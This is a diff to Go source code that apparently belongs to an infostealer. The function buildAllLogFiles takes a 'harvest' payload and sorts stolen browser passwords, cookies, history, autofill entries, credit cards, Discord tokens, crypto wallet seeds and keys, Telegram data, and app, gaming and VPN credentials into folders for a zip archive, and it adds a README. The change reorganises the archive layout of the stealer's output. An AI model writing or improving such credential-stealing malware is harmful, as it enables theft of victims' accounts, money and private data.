@@ -19,71 +19,77 @@ func buildAllLogFiles(p *harvestPayload) map[string][]byte {
 	r := p.Result
 	out := map[string][]byte{
 		"summary.txt": []byte(harvestSummary(p)),
+		"README.txt":  []byte(zipReadmeText()),
 	}
 
 	if data := passwordsLog(r.Passwords); len(data) > 0 {
-		out["passwords.txt"] = data
-	}
-	if data := passwordCandidatesLog(r.PasswordCandidates); len(data) > 0 {
-		out["password_candidates.txt"] = data
-	}
-	if data := jsonLog("password_candidates.json", r.PasswordCandidates); len(data) > 0 {
-		out["password_candidates.json"] = data
+		out[zipLogsBrowsers+"passwords.txt"] = data
 	}
 	if data := cookiesNetscape(p); len(data) > 0 {
-		out["cookies.txt"] = data
+		out[zipLogsBrowsers+"cookies.txt"] = data
 	}
 	if data := historyLog(r.History); len(data) > 0 {
-		out["history.txt"] = data
+		out[zipLogsBrowsers+"history.txt"] = data
 	}
 	if data := autofillLog(r.Autofill); len(data) > 0 {
-		out["autofill.txt"] = data
+		out[zipLogsBrowsers+"autofill.txt"] = data
 	}
 	if data := bookmarksLog(r.Bookmarks); len(data) > 0 {
-		out["bookmarks.txt"] = data
+		out[zipLogsBrowsers+"bookmarks.txt"] = data
 	}
 	if data := creditCardsLog(r.CreditCards); len(data) > 0 {
-		out["credit_cards.txt"] = data
-	}
-	if data := discordTokensLog(r.DiscordTokens); len(data) > 0 {
-		out["discord_tokens.txt"] = data
-	}
-	if data := seedsLog(p.Seeds); len(data) > 0 {
-		out["seeds.txt"] = data
+		out[zipLogsBrowsers+"credit_cards.txt"] = data
 	}
 	if data := jsonLog("extensions.json", r.Extensions); len(data) > 0 {
-		out["extensions.json"] = data
+		out[zipLogsBrowsers+"extensions.json"] = data
 	}
-	if data := jsonLog("wallets.json", r.Wallets); len(data) > 0 {
-		out["wallets.json"] = data
-	}
-	if data := jsonLog("keys.json", r.Keys); len(data) > 0 {
-		out["keys.json"] = data
-	}
-	if data := jsonLog("files.json", r.Files); len(data) > 0 {
-		out["files.json"] = data
-	}
-	if data := jsonLog("telegram.json", r.Telegram); len(data) > 0 {
-		out["telegram.json"] = data
-	}
+
 	if data := appCredentialsLog(r.AppCredentials); len(data) > 0 {
-		out["app_credentials.txt"] = data
+		out[zipLogsApps+"app_credentials.txt"] = data
 	}
 	if data := jsonLog("app_credentials.json", r.AppCredentials); len(data) > 0 {
-		out["app_credentials.json"] = data
+		out[zipLogsApps+"app_credentials.json"] = data
 	}
 	if r.Gaming != nil {
 		if data := jsonLog("gaming.json", r.Gaming); len(data) > 0 {
-			out["gaming.json"] = data
+			out[zipLogsApps+"gaming.json"] = data
 		}
 	}
 	if r.VPNs != nil {
 		if data := jsonLog("vpns.json", r.VPNs); len(data) > 0 {
-			out["vpns.json"] = data
+			out[zipLogsApps+"vpns.json"] = data
 		}
 	}
+
+	if data := discordTokensLog(r.DiscordTokens); len(data) > 0 {
+		out[zipLogsDiscord+"discord_tokens.txt"] = data
+	}
+
+	if data := seedsLog(p.Seeds); len(data) > 0 {
+		out[zipLogsSeeds+"seeds.txt"] = data
+	}
+
+	if data := passwordCandidatesLog(r.PasswordCandidates); len(data) > 0 {
+		out[zipLogsKeys+"password_candidates.txt"] = data
+	}
+	if data := jsonLog("password_candidates.json", r.PasswordCandidates); len(data) > 0 {
+		out[zipLogsKeys+"password_candidates.json"] = data
+	}
+	if data := jsonLog("keys.json", r.Keys); len(data) > 0 {
+		out[zipLogsKeys+"keys.json"] = data
+	}
+
+	if data := jsonLog("wallets.json", r.Wallets); len(data) > 0 {
+		out[zipLogsMeta+"wallets.json"] = data
+	}
+	if data := jsonLog("files.json", r.Files); len(data) > 0 {
+		out[zipLogsMeta+"files.json"] = data
+	}
+	if data := jsonLog("telegram.json", r.Telegram); len(data) > 0 {
+		out[zipLogsMeta+"telegram.json"] = data
+	}
 	if data, err := json.MarshalIndent(p, "", "  "); err == nil && len(data) > 0 {
-		out["harvest.json"] = data
+		out[zipLogsMeta+"harvest.json"] = data
 	}
 	return out
 }
